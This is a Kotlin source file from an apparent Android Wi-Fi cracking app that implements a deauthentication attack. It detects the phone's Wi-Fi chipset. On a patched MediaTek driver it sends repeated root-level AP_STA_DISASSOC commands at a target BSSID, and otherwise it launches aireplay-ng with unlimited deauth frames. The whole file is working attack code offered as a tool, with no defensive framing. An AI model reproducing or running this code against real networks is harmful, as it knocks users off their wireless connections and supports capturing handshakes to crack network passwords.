package com.wificracker.attack.domain.attacks

import com.wificracker.attack.model.Attack
import com.wificracker.core.root.BinaryInstaller
import com.wificracker.core.root.ShellExecutor
import com.wificracker.core.wifi.ChipsetMonitorHelper
import com.wificracker.core.wifi.WifiChipVendor
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DeauthAttack @Inject constructor(
    private val shellExecutor: ShellExecutor,
    private val binaryInstaller: BinaryInstaller,
    private val chipsetMonitorHelper: ChipsetMonitorHelper,
) : WifiAttack {
    override fun execute(attack: Attack): Flow<String> = flow {
        val chipInfo = chipsetMonitorHelper.detectChipVendor()

        if (chipInfo.vendor == WifiChipVendor.MEDIATEK && chipInfo.patchInstalled) {
            // MTK patched driver v3: use AP_STA_DISASSOC (internal deauth via firmware TX)
            emit("[*] Using MTK internal deauth on ${attack.targetBssid}")
            emit("[*] Sending deauth via AP_STA_DISASSOC...")

            var count = 0
            while (count < 50) {
                val result = shellExecutor.executeAsRoot(
                    "/data/local/tmp/wpa_driver \"AP_STA_DISASSOC Mac=${attack.targetBssid}\""
                )
                count++
                if (count % 10 == 0) {
                    emit("[*] Sent $count deauth frames to ${attack.targetBssid}")
                }
                delay(100) // 100ms between deauths
            }
            emit("[+] Deauth attack completed: $count frames sent to ${attack.targetBssid}")
        } else {
            // Standard: aireplay-ng (requires monitor mode + USB adapter)
            val binary = binaryInstaller.getBinaryPath("aireplay-ng")
            emit("[*] Starting aireplay-ng deauth on ${attack.targetBssid}")
            val cmd = "$binary --deauth 0 -a ${attack.targetBssid} ${attack.interfaceName}"
            shellExecutor.executeAsRoot(cmd)
            emit("[+] Deauth packets sent to ${attack.targetBssid}")
        }
    }.flowOn(Dispatchers.IO)

    override fun stop(attack: Attack) {
        shellExecutor.executeAsRoot("pkill -f 'aireplay-ng.*${attack.targetBssid}' 2>/dev/null")
    }
}
